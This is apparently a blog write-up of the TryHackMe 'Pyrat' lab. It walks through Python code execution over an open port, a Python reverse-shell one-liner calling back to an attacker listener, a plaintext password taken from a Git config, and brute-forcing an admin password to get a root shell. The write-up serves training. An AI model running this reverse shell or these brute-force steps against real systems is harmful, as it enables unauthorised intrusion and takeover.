---
title: Pyrat
description: 'RCE through an open port which executes Python code, finding credentials in a Git config file and brute forcing a Python service'
pubDate: 2024-12-17
category: 'tryhackme'
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1718377487436'
---

```bash
telnet 10.10.120.110 8000
...[snip]...
?
invalid syntax (<string>, line 1)
python -c "print(7*7)"
invalid syntax (<string>, line 1)
print(7*7)
49
```

We get code execution by just supplying a python command.
Pasting in a python reverse shell we get a callback on our listener:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.28.13",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
```

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.28.13] from (UNKNOWN) [10.10.120.110] 41444
bash: /root/.bashrc: Permission denied
www-data@Pyrat:~$
```

## USER

Looking around on the file system we find a `.git` directory.

```bash
cd /opt/dev/
ls -al
total 12
drwxrwxr-x 3 think think 4096 Jun 21  2023 .
drwxr-xr-x 3 root  root  4096 Jun 21  2023 ..
drwxrwxr-x 8 think think 4096 Jun 21  2023 .git

git status
fatal: detected dubious ownership in repository at '/opt/dev'
To add an exception for this directory, call:

        git config --global --add safe.directory /opt/dev
```

We can't add it to our global config:

```bash
git config --global --add safe.directory /opt/dev
warning: unable to access '/root/.gitconfig': Permission denied
warning: unable to access '/root/.config/git/config': Permission denied
error: could not lock config file /root/.gitconfig: Permission denied
```

Digging through the files in the `.git` directory we see there is a username and password in the config:

```bash
www-data@Pyrat:/opt/dev/.git$ cat config
...[snip]...
        username = think
        password = _TH1NKINGPirate$_
```

Lets try to switch to this user:

```bash
su think
Password: # <-- _TH1NKINGPirate$_
think@Pyrat:/opt/dev/.git$ id
uid=1000(think) gid=1000(think) groups=1000(think)
```

We can use the same credentials to SSH in to the machine.

## ROOT

With the `think` user we can interact with the git info in the `/opt/dev` directory.

```bash
cd /opt/dev/
git status
...[snip]...
deleted:    pyrat.py.old
...[snip]...
```

Lets see what actually changed:

```bash
git diff
diff --git a/pyrat.py.old b/pyrat.py.old
deleted file mode 100644
index ce425cf..0000000
--- a/pyrat.py.old
+++ /dev/null
@@ -1,27 +0,0 @@
-...............................................
-
-def switch_case(client_socket, data):
-    if data == 'some_endpoint':
-        get_this_enpoint(client_socket)
-    else:
-        # Check socket is admin and downgrade if is not aprooved
-        uid = os.getuid()
-        if (uid == 0):
-            change_uid()
-
-        if data == 'shell':
-            shell(client_socket)
-        else:
-            exec_python(client_socket, data)
-
-def shell(client_socket):
-    try:
-        import pty
-        os.dup2(client_socket.fileno(), 0)
-        os.dup2(client_socket.fileno(), 1)
-        os.dup2(client_socket.fileno(), 2)
-        pty.spawn("/bin/sh")
-    except Exception as e:
-        send_data(client_socket, e
-
-...............................................
```

We have to brute force the password, we know the username is `admin`.

Borrowing `brute.py` (https://loghmariala.github.io/posts/Pyrat/) to brute force the password:

```bash
python brute.py
Trying password: 123456
Password 123456 is incorrect.
...[snip]...
Trying password: abc123
Success! Password is: abc123
```

Now we can get a root shell on the telnet server:

```bash
telnet 10.10.120.110 8000
Trying 10.10.120.110...
Connected to 10.10.120.110.
Escape character is '^]'.
admin
Password:
abc123
Welcome Admin!!! Type "shell" to begin
shell
# id
id

uid=0(root) gid=0(root) groups=0(root)
```
